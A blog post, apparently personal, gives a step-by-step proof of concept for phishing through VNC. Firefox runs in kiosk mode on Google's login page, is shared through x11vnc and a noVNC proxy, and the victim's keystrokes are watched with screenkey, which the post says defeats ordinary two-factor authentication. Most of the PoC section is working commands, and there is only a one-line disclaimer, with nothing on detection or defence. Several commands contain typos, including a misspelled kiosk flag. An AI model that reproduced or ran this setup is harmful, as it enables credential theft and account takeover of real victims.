---
layout: distill
title: Phishing Attacks with VNC
date: 2024-05-04
description: TBA
tags: tag, tag
categories: TBA
pretty_table: true
thumbnail: TBA
toc:
  - name: Introduction
  - name: Important Disclaimer
  - name: Security Context
  - name: PoC
  - name: Conclusions
  - name: Credits
---

### Introduction

On February 19, 2022, [Mr. d0x](https://twitter.com/mrd0x) a cybersecurity researcher introduced a method that uses VNC for phishing attacks. I was impressed by the cleverness of this idea.

### Background

VNC, or Virtual Network Computing, is a way to share screens and control another computer remotely. It works by installing a VNC server on the computer you want to control, and a VNC viewer on the device you're using to control it.

Using VNC in a phishing attack is straightforward. We set up a VNC server, share our screen, specifically our browser window, and trick the victim into believing they are controlling their own browser while they are actually connected to our browser, allowing us to intercept any data that passes.

Using a library called [noVNC](https://novnc.com/), we can establish connections to VNC servers through modern web browsers.

This phishing technique has several benefits over traditional phishing methods:

- We can record all keystrokes made by the victim
- We can watch in real-time what the victim is doing on a website
- Regular Two-factor authentication will not protect against this type of attack

### Important Disclaimer

The information provided is for educational purposes only. I do not take responsibility for any actions taken based on the information provided.

### Security Context

Please note that the PoC demonstrated in this guide is not safe for "production" use, as it lacking essential security configurations.

---

### Prerequisites

- Linux

---

# PoC

First we lachnge Firefox, or any other browser in kiosk mode.

so, first what is kiosk mode?

Kiosk software is the system and user interface software designed for an interactive kiosk or Internet kiosk enclosing the system in a way that prevents user interaction and activities on the device outside the scope of execution of the netkiosk.

Why do need kiosk mode?

Without kiosk mode, the vicitim might be able to control other parts of our attacking machine, that we probarly dont want to happen.

In the terminal, run:

```bash
firefox --kisok https://accounts.google.com
```

Now in a new terminal window, we will use noVNC.

noVNC is a VNC client library that can run on almost any browsers.

```bash
git clone https://github.com/novnc/noVNC
cd noVNC
./utils/novnc_proxy --listen 0.0.0.0:8080 --vnc localhost:5900
```

{% include figure.liquid loading="eager" path="assets/img/posts/2/2.png" class="img-fluid rounded z-depth-1" zoomable=true %}

now we need to get the id of Firefox proccess running, we can use `xwininfo | grep` run this command and select the firefox browser, the terminal will print the id back.

After we have the id, we will star a local vnc server with:

```bash
sudo apt update
sudo apt install x11vnc
x11vnc -id <firefox_window_id>
```

Almost done! Now all left to do is use some kind keylogger, we can use `screenkey` to see key presses by the victim in real time, (note: it will also show our own key presses so please be aware):

```
sudo apt install screenkey -y
screenkey
```

Now all left to do is open up the the browser from the vicitm and enter the following url: `http://<ip>:8080/vnc.html?autoconnect=true`

When the vicitim will enter this url he will see the google accounts login page, without knowing it is a streaming video that he can interact with, this is crazy!
